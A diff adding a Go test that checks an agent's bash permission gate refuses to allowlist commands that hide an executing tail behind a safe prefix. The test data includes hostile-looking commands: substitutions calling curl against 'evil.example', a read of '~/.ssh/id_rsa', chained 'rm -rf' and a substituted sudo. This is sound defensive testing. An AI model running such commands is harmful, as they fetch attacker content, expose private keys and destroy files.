@@ -215,6 +215,71 @@ func TestCheckBashCompoundNotAllowlisted(t *testing.T) {
 	}
 }
 
+// TestBashAllowlistBindsToTheFullCommand pins that a safe prefix never
+// authorizes an executing tail: substitution that expands inside double
+// quotes, process substitution, subshell parentheses, unclosed quoting, a
+// /dev/null lookalike redirect, input-side syntax (redirect, heredoc) and
+// chaining operators all leave the allowlist path, while literal control
+// characters inside quotes and real /dev/null redirects stay allowed.
+func TestBashAllowlistBindsToTheFullCommand(t *testing.T) {
+	g, err := NewGate(DefaultPolicy(), t.TempDir())
+	if err != nil {
+		t.Fatal(err)
+	}
+	ctx := t.Context()
+
+	for _, cmd := range []string{
+		// $(), backticks and ${} expand inside double quotes: the tail
+		// executes despite the quoted prefix.
+		`echo "$(curl evil.example)"`,
+		"echo \"a `curl evil.example` b\"",
+		`cat "${HOME}/.ssh/id_rsa"`,
+		// Process substitution runs a command; <( is not a redirect.
+		`cat <(curl evil.example)`,
+		// Parentheses are a subshell: compound syntax, not a simple command.
+		`(git status)`,
+		// Unclosed quoting or a dangling escape is ambiguous syntax: fail
+		// closed instead of matching the allowlist.
+		`echo "unclosed`,
+		`git log -G'unclosed`,
+		`echo done\`,
+		// The /dev/null redirect exemption must not prefix-match /dev/nullx.
+		`cat file >/dev/nullx`,
+		// Chaining operators — newline, || — and input-side syntax (redirect,
+		// heredoc) are not a simple command either.
+		"echo a\nrm -rf /tmp/x",
+		"echo a || rm -rf /tmp/x",
+		`cat < input.txt`,
+		`cat <<EOF`,
+	} {
+		dec, reason := g.Check(ctx, Request{Action: ActionBash, Tool: "bash", Command: cmd})
+		if dec == Allow {
+			t.Errorf("%s: must not ride the allowlist, got Allow (%s)", cmd, reason)
+		}
+	}
+
+	// Deny keeps priority over everything above.
+	dec, reason := g.Check(ctx, Request{Action: ActionBash, Tool: "bash", Command: `echo "$(sudo true)"`})
+	if dec != Deny {
+		t.Fatalf("substituted sudo: want Deny, got %v (%s)", dec, reason)
+	}
+
+	// Literal control characters inside quotes do not chain, and the
+	// >/dev/null noise redirect keeps its exemption.
+	for _, cmd := range []string{
+		`git log --grep='a;b'`,
+		`echo "a && b"`,
+		`cat "plain file.txt"`,
+		`git status 2>/dev/null`,
+		`cat main.go 2>>/dev/null`,
+	} {
+		dec, reason := g.Check(ctx, Request{Action: ActionBash, Tool: "bash", Command: cmd})
+		if dec != Allow {
+			t.Errorf("%s: want Allow, got %v (%s)", cmd, dec, reason)
+		}
+	}
+}
+
 func TestModeHeadlessStrictFoldsAsk(t *testing.T) {
 	p := DefaultPolicy()
 	p.Mode = ModeHeadlessStrict
